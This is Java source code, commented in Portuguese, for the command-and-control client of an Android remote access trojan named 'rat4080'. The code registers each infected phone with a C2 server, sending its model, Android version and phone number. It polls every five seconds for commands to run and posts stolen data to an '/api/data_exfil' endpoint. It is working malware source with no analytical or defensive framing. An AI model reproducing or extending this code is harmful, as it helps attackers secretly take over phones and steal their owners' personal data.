package com.rat4080.trojan;

import android.content.Context;
import android.os.Build;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * C2Client — Comunicação HTTP com o servidor C2 (porta 80)
 * Polling a cada 5 segundos, registo automático, reconexão contínua.
 */
public class C2Client {

    private static final String TAG = "Rat4080C2";
    
    // URL do servidor C2 — SEM porta porque é 80 (implícita)
    // Substituído pelo gerador: http://10.0.0.1 -> http://teu-dominio
    private static String C2_URL = "http://10.0.0.1";

    private Context context;
    private String deviceId;
    private C2Listener listener;
    private AtomicBoolean running;
    private Thread connectionThread;
    private long lastPollTime = 0;
    private static final long POLL_INTERVAL_MS = 5000;

    public interface C2Listener {
        void onCommandReceived(JSONObject command);
        void onConnected();
        void onDisconnected();
    }

    public C2Client(Context context, String deviceId, C2Listener listener) {
        this.context = context;
        this.deviceId = deviceId;
        this.listener = listener;
        this.running = new AtomicBoolean(false);
    }

    /**
     * Inicia a ligação ao C2 em thread separada.
     * Loop infinito de polling até disconnect().
     */
    public void connect() {
        if (running.get()) return;
        running.set(true);

        connectionThread = new Thread(() -> {
            Log.i(TAG, "A ligar ao C2: " + C2_URL);
            while (running.get()) {
                try {
                    // 1) REGISTA-SE NO C2
                    JSONObject response = registerWithC2();

                    if (response != null && response.optBoolean("success", false)) {
                        // 2) NOTIFICA LIGAÇÃO BEM-SUCEDIDA
                        listener.onConnected();

                        // 3) PROCESSA COMANDOS PENDENTES
                        JSONArray commands = response.optJSONArray("commands");
                        if (commands != null) {
                            for (int i = 0; i < commands.length(); i++) {
                                JSONObject command = commands.optJSONObject(i);
                                if (command != null) {
                                    listener.onCommandReceived(command);
                                }
                            }
                        }

                        // 4) ATUALIZA TIMESTAMP DO ÚLTIMO POLL
                        lastPollTime = System.currentTimeMillis();
                    } else {
                        // Resposta nula ou sem sucesso — considera falha
                        listener.onDisconnected();
                        sleepSafely(10000);
                        continue;
                    }

                    // 5) POLLING PERIÓDICO
                    sleepSafely(POLL_INTERVAL_MS);

                } catch (Exception e) {
                    Log.e(TAG, "Erro na ligação: " + e.getMessage());
                    listener.onDisconnected();
                    sleepSafely(10000);
                }
            }
            Log.i(TAG, "Ligação ao C2 terminada.");
        });

        connectionThread.setDaemon(true);
        connectionThread.start();
    }

    /**
     * Regista-se no servidor C2 e devolve os comandos pendentes.
     * Endpoint: POST /api/device_connect
     */
    private JSONObject registerWithC2() {
        HttpURLConnection conn = null;
        try {
            URL url = new URL(C2_URL + "/api/device_connect");
            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setConnectTimeout(10000);
            conn.setReadTimeout(10000);
            conn.setDoOutput(true);

            // Monta o JSON de registo
            JSONObject registerData = new JSONObject();
            registerData.put("device_id", deviceId);
            registerData.put("model", Build.MODEL);
            registerData.put("manufacturer", Build.MANUFACTURER);
            registerData.put("android_version", Build.VERSION.RELEASE);
            registerData.put("phone_number", getPhoneNumber());
            registerData.put("sdk_version", Build.VERSION.SDK_INT);

            // Envia
            OutputStream os = conn.getOutputStream();
            os.write(registerData.toString().getBytes("UTF-8"));
            os.flush();
            os.close();

            // Lê resposta
            int responseCode = conn.getResponseCode();
            if (responseCode == 200) {
                String responseBody = readStream(conn.getInputStream());
                return new JSONObject(responseBody);
            }

        } catch (Exception e) {
            Log.e(TAG, "Falha no registo: " + e.getMessage());
        } finally {
            if (conn != null) conn.disconnect();
        }
        return null;
    }

    /**
     * Envia dados recolhidos para o C2.
     * Endpoint: POST /api/data_exfil
     */
    public void sendData(String dataType, JSONObject content) {
        HttpURLConnection conn = null;
        try {
            URL url = new URL(C2_URL + "/api/data_exfil");
            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setConnectTimeout(10000);
            conn.setReadTimeout(10000);
            conn.setDoOutput(true);

            JSONObject payload = new JSONObject();
            payload.put("device_id", deviceId);
            payload.put("data_type", dataType);
            payload.put("content", content);

            OutputStream os = conn.getOutputStream();
            os.write(payload.toString().getBytes("UTF-8"));
            os.flush();
            os.close();

            conn.getResponseCode();
        } catch (Exception e) {
            Log.e(TAG, "Falha ao enviar dados: " + e.getMessage());
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    /**
     * Envia o resultado de um comando de volta para o C2.
     * Endpoint: POST /api/command_result
     */
    public void sendCommandResult(int commandId, JSONObject result) {
        HttpURLConnection conn = null;
        try {
            URL url = new URL(C2_URL + "/api/command_result");
            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setConnectTimeout(10000);
            conn.setReadTimeout(10000);
            conn.setDoOutput(true);

            JSONObject payload = new JSONObject();
            payload.put("device_id", deviceId);
            payload.put("command_id", commandId);
            payload.put("result", result);

            OutputStream os = conn.getOutputStream();
            os.write(payload.toString().getBytes("UTF-8"));
            os.flush();
            os.close();

            conn.getResponseCode();
        } catch (Exception e) {
            Log.e(TAG, "Falha ao enviar resultado: " + e.getMessage());
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    /**
     * Lê o conteúdo de um InputStream e devolve como String.
     */
    private String readStream(InputStream is) throws Exception {
        StringBuilder sb = new StringBuilder();
        BufferedReader reader = new BufferedReader(new InputStreamReader(is, "UTF-8"));
        String line;
        while ((line = reader.readLine()) != null) {
            sb.append(line);
        }
        reader.close();
        return sb.toString();
    }

    /**
     * Obtém o número de telefone do dispositivo (se disponível).
     */
    private String getPhoneNumber() {
        try {
            android.telephony.TelephonyManager tm = (android.telephony.TelephonyManager)
                    context.getSystemService(Context.TELEPHONY_SERVICE);
            if (tm != null) {
                return tm.getLine1Number();
            }
        } catch (Exception e) {
            Log.e(TAG, "Erro ao obter número: " + e.getMessage());
        }
        return "Desconhecido";
    }

    /**
     * Dorme sem lançar exceção (usado no loop de polling).
     */
    private void sleepSafely(long ms) {
        try {
            Thread.sleep(ms);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
    }

    /**
     * Termina a ligação e para o loop de polling.
     */
    public void disconnect() {
        running.set(false);
        if (connectionThread != null) {
            connectionThread.interrupt();
        }
    }

    /**
     * Atualiza o URL do C2 em runtime (útil para o gerador).
     */
    public static void setC2Url(String url) {
        C2_URL = url;
    }

    /**
     * Devolve o URL atual do C2.
     */
    public static String getC2Url() {
        return C2_URL;
    }
}
